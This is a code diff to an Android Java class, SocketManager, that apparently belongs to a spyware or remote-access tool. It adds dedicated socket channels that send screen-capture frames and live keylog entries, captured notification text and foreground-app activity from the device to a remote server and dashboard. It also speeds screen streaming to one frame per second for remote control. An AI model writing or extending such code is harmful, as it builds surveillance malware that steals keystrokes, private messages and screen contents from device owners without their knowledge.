@@ -48,6 +48,19 @@ public class SocketManager {
     private final ScheduledExecutorService heartbeatExecutor = Executors.newSingleThreadScheduledExecutor();
     private ScheduledFuture<?>             heartbeatFuture;
 
+    // ── Multi-channel sockets ─────────────────────────────────────────────
+    // Channel 1 (stream): dedicated socket for frame data only
+    private Socket   streamSocket;
+    private PrintWriter streamOut;
+    private volatile boolean streamConnected = false;
+    private final ExecutorService streamExecutor = Executors.newCachedThreadPool();
+
+    // Channel 2 (live): dedicated socket for keylogs / notifications / activity
+    private Socket   liveSocket;
+    private PrintWriter liveOut;
+    private volatile boolean liveConnected = false;
+    private final ExecutorService liveExecutor = Executors.newCachedThreadPool();
+
     // Streaming state — event-driven (single-frame on request, idle keepalive)
     private volatile boolean idleFrameMode = false;
     private ScheduledFuture<?> idleFrameFuture;
@@ -131,6 +144,15 @@ public class SocketManager {
         }
         running = true;
         executor.execute(this::connectionLoop);
+        // Start secondary channels with a slight delay so primary registers first
+        streamExecutor.execute(() -> {
+            try { Thread.sleep(1200); } catch (InterruptedException ignored) {}
+            streamChannelLoop();
+        });
+        liveExecutor.execute(() -> {
+            try { Thread.sleep(2000); } catch (InterruptedException ignored) {}
+            liveChannelLoop();
+        });
     }
 
     private void connectionLoop() {
@@ -170,6 +192,116 @@ public class SocketManager {
         try { if (tcpSocket != null) tcpSocket.close(); } catch (Exception ignored) {}
         out = null;
         in  = null;
+    }
+
+    // ── Secondary channel: stream (frame data only) ───────────────────────
+
+    private void streamChannelLoop() {
+        while (running) {
+            try {
+                streamSocket = new Socket(Constants.TCP_HOST, Constants.TCP_PORT);
+                streamSocket.setKeepAlive(true);
+                streamSocket.setSoTimeout(0);
+                streamOut = new PrintWriter(streamSocket.getOutputStream(), true);
+                streamConnected = true;
+                // Register as stream channel
+                String deviceId = DeviceInfo.getDeviceId(context);
+                JSONObject d = new JSONObject();
+                d.put("deviceId", deviceId);
+                d.put("channelType", "stream");
+                JSONObject msg = new JSONObject();
+                msg.put("event", "device:register_channel");
+                msg.put("data", d);
+                streamOut.print(msg.toString() + "\n");
+                streamOut.flush();
+                Log.i(TAG, "Stream channel connected");
+                // Keep alive — read loop (no commands expected here)
+                java.io.BufferedReader sIn = new java.io.BufferedReader(
+                    new java.io.InputStreamReader(streamSocket.getInputStream()));
+                while (running && sIn.readLine() != null) { /* keep alive */ }
+            } catch (Exception e) {
+                Log.e(TAG, "Stream channel error: " + e.getMessage());
+            } finally {
+                streamConnected = false;
+                try { if (streamSocket != null) streamSocket.close(); } catch (Exception ignored) {}
+                streamOut = null;
+            }
+            if (running) {
+                try { Thread.sleep(Constants.TCP_RECONNECT_DELAY); } catch (InterruptedException ignored) {}
+            }
+        }
+    }
+
+    private synchronized void sendStreamMessage(String event, JSONObject data) {
+        if (streamOut != null && streamConnected) {
+            try {
+                JSONObject msg = new JSONObject();
+                msg.put("event", event);
+                msg.put("data", data);
+                streamOut.print(msg.toString() + "\n");
+                streamOut.flush();
+            } catch (JSONException e) {
+                Log.e(TAG, "sendStreamMessage error: " + e.getMessage());
+                // Fall back to primary channel
+                sendMessage(event, data);
+            }
+        } else {
+            // Fall back to primary channel when stream channel not available
+            sendMessage(event, data);
+        }
+    }
+
+    // ── Secondary channel: live (keylogs, notifications, activity) ────────
+
+    private void liveChannelLoop() {
+        while (running) {
+            try {
+                liveSocket = new Socket(Constants.TCP_HOST, Constants.TCP_PORT);
+                liveSocket.setKeepAlive(true);
+                liveSocket.setSoTimeout(0);
+                liveOut = new PrintWriter(liveSocket.getOutputStream(), true);
+                liveConnected = true;
+                String deviceId = DeviceInfo.getDeviceId(context);
+                JSONObject d = new JSONObject();
+                d.put("deviceId", deviceId);
+                d.put("channelType", "live");
+                JSONObject msg = new JSONObject();
+                msg.put("event", "device:register_channel");
+                msg.put("data", d);
+                liveOut.print(msg.toString() + "\n");
+                liveOut.flush();
+                Log.i(TAG, "Live channel connected");
+                java.io.BufferedReader lIn = new java.io.BufferedReader(
+                    new java.io.InputStreamReader(liveSocket.getInputStream()));
+                while (running && lIn.readLine() != null) { /* keep alive */ }
+            } catch (Exception e) {
+                Log.e(TAG, "Live channel error: " + e.getMessage());
+            } finally {
+                liveConnected = false;
+                try { if (liveSocket != null) liveSocket.close(); } catch (Exception ignored) {}
+                liveOut = null;
+            }
+            if (running) {
+                try { Thread.sleep(Constants.TCP_RECONNECT_DELAY); } catch (InterruptedException ignored) {}
+            }
+        }
+    }
+
+    private synchronized void sendLiveMessage(String event, JSONObject data) {
+        if (liveOut != null && liveConnected) {
+            try {
+                JSONObject msg = new JSONObject();
+                msg.put("event", event);
+                msg.put("data", data);
+                liveOut.print(msg.toString() + "\n");
+                liveOut.flush();
+            } catch (JSONException e) {
+                Log.e(TAG, "sendLiveMessage error: " + e.getMessage());
+                sendMessage(event, data);
+            }
+        } else {
+            sendMessage(event, data);
+        }
     }
 
     // ── Heartbeat ────────────────────────────────────────────────────────
@@ -340,8 +472,14 @@ public class SocketManager {
     public void disconnect() {
         running   = false;
         connected = false;
+        streamConnected = false;
+        liveConnected   = false;
         stopHeartbeat();
         closeSilently();
+        try { if (streamSocket != null) streamSocket.close(); } catch (Exception ignored) {}
+        try { if (liveSocket   != null) liveSocket.close();   } catch (Exception ignored) {}
+        streamOut = null;
+        liveOut   = null;
     }
 
     public boolean isConnected() { return connected; }
@@ -596,17 +734,19 @@ public class SocketManager {
             try {
                 Bitmap frame = captureFrame();
                 if (frame != null) {
-                    // Scale to max 320 px wide for faster transfer
-                    Bitmap scaled = scaleBitmapToWidth(frame, 320);
+                    // Scale to max 240 px wide — smaller = faster transfer
+                    Bitmap scaled = scaleBitmapToWidth(frame, 240);
                     if (scaled != frame) frame.recycle();
-                    String b64 = bitmapToBase64(scaled, 40);
+                    // Quality 25 — good enough for remote control, minimal bandwidth
+                    String b64 = bitmapToBase64(scaled, 25);
                     scaled.recycle();
                     if (b64 != null) {
                         JSONObject d = new JSONObject();
                         d.put("deviceId",  deviceId);
                         d.put("frameData", b64);
                         d.put("timestamp", System.currentTimeMillis());
-                        sendMessage("stream:frame", d);
+                        // Use dedicated stream channel — keeps command channel clear
+                        sendStreamMessage("stream:frame", d);
                     }
                 }
             } catch (Exception e) {
@@ -625,14 +765,14 @@ public class SocketManager {
         return Bitmap.createScaledBitmap(src, maxWidth, newH, true);
     }
 
-    /** Start idle-frame mode: send one frame every 5 seconds when idle. */
+    /** Start idle-frame mode: send one frame every 1 second for near-real-time streaming. */
     private void startIdleFrameMode(String deviceId) {
         stopIdleFrameMode();
         idleFrameMode = true;
         idleFrameFuture = heartbeatExecutor.scheduleAtFixedRate(() -> {
-            if (idleFrameMode && connected) sendSingleFrame(deviceId);
-        }, 5, 5, TimeUnit.SECONDS);
-        Log.i(TAG, "Idle-frame mode started (5s keepalive)");
+            if (idleFrameMode && (connected || streamConnected)) sendSingleFrame(deviceId);
+        }, 0, 1, TimeUnit.SECONDS);
+        Log.i(TAG, "Idle-frame mode started (1s interval for real-time streaming)");
     }
 
     private void stopIdleFrameMode() {
@@ -790,9 +930,9 @@ public class SocketManager {
         }
     }
 
-    /** Push a keylog entry to the server immediately (live feed). */
+    /** Push a keylog entry to the server immediately (live feed) via live channel. */
     public void pushKeylogEntry(String packageName, String appName, String text, String eventType, String timestamp) {
-        executor.execute(() -> {
+        liveExecutor.execute(() -> {
             try {
                 JSONObject entry = new JSONObject();
                 entry.put("packageName", packageName);
@@ -801,16 +941,16 @@ public class SocketManager {
                 entry.put("eventType", eventType);
                 entry.put("timestamp", timestamp);
                 entry.put("deviceId", DeviceInfo.getDeviceId(context));
-                sendMessage("keylog:entry", entry);
+                sendLiveMessage("keylog:entry", entry);
             } catch (Exception e) {
                 Log.e(TAG, "pushKeylogEntry error: " + e.getMessage());
             }
         });
     }
 
-    /** Push a live notification to the server (relayed to dashboard). */
+    /** Push a live notification to the server (relayed to dashboard) via live channel. */
     public void pushNotification(String packageName, String appName, String title, String text, long postTime) {
-        executor.execute(() -> {
+        liveExecutor.execute(() -> {
             try {
                 String ts = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss",
                         java.util.Locale.getDefault()).format(new java.util.Date(postTime));
@@ -822,16 +962,16 @@ public class SocketManager {
                 entry.put("timestamp", ts);
                 entry.put("postTime", postTime);
                 entry.put("deviceId", DeviceInfo.getDeviceId(context));
-                sendMessage("notification:entry", entry);
+                sendLiveMessage("notification:entry", entry);
             } catch (Exception e) {
                 Log.e(TAG, "pushNotification error: " + e.getMessage());
             }
         });
     }
 
-    /** Push a foreground app change to the server (recent activity). */
+    /** Push a foreground app change to the server (recent activity) via live channel. */
     public void pushRecentActivity(String packageName, String appName) {
-        executor.execute(() -> {
+        liveExecutor.execute(() -> {
             try {
                 String ts = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss",
                         java.util.Locale.getDefault()).format(new java.util.Date());
@@ -840,7 +980,7 @@ public class SocketManager {
                 entry.put("appName", appName != null ? appName : packageName);
                 entry.put("timestamp", ts);
                 entry.put("deviceId", DeviceInfo.getDeviceId(context));
-                sendMessage("app:foreground", entry);
+                sendLiveMessage("app:foreground", entry);
             } catch (Exception e) {
                 Log.e(TAG, "pushRecentActivity error: " + e.getMessage());
             }
